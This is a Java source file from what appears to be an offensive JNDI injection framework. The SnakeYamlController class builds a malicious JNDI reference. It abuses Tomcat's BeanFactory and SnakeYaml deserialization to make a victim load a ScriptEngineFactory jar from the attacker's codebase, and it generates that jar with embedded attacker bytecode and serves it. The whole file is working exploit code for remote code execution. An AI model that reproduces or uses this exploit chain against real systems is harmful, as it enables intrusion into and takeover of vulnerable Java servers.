package map.jndi.controller.bypass;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.JavaScriptPayload;
import map.jndi.server.WebServer;
import map.jndi.template.ScriptLoader;
import map.jndi.util.JarUtil;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/SnakeYaml")
public class SnakeYamlController extends BasicController {
    @Override
    public Object process(byte[] byteCode) throws Exception {
        System.out.println("[Reference] Factory: BeanFactory + SnakeYaml");

        String factoryClassName = MiscUtil.getClassName();
        String jarName = MiscUtil.getRandStr(8);

        String code = JavaScriptPayload.loadClass(byteCode);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"" + Main.config.codebase + jarName + ".jar" + "\"]\n" +
                "  ]]\n" +
                "]";

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ScriptLoader.class.getName());
        CtClass superClazz = pool.get("javax.script.ScriptEngineFactory");
        clazz.replaceClassName(clazz.getName(), factoryClassName);
        clazz.setInterfaces(new CtClass[]{superClazz});
        ReflectUtil.setCtField(clazz, "code", CtField.Initializer.constant(code));

        byte[] jarBytes = JarUtil.createWithSPI("javax.script.ScriptEngineFactory", factoryClassName, clazz.toBytecode());
        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);

        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));

        return ref;
    }
}
